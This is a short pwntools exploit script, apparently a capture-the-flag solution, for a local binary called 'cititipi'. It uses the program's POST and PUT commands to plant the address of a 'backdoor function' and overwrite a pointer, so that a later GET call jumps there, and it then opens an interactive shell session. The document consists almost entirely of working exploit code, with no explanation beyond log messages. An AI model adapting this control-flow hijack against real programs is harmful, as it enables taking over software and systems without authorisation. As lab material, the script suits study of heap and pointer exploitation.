from pwn import *
elf = ELF('./cititipi', checksec=False)

def post(data, method=1):
    p.sendline(b'POST')
    if method:
        p.sendline(b'KKST')
    else:
        p.sendline(b'2020')
        
    p.sendline(b'%s' % data)
    return int(p.recvlines(2)[1].strip())

def delete(address):
    p.sendline(b'DELETE')
    p.sendline(b'%d' % address)

def put(address, data):
    p.sendline(b'PUT')
    p.sendline(b'%d' % address)
    p.sendline(b'%s' % data)
    return int(p.recvlines(2)[1].strip())


def get(address):
    p.sendline(b'GET')
    p.sendline(b'%d' % address)


p = elf.process()

a = post(b'A'*0x8 + p32(0x08048fa0))
log.info(f'alloc a at 0x{a:x}')
b = post(b'B'*8, method=0)
log.info(f'alloc b at 0x{b:x}')

b = put(b, p32(a))
log.info(f'put b at 0x{b:x}')
log.info(f'$eax is overwritten with backdoor function, call $eax now ...')

get(b)
p.interactive()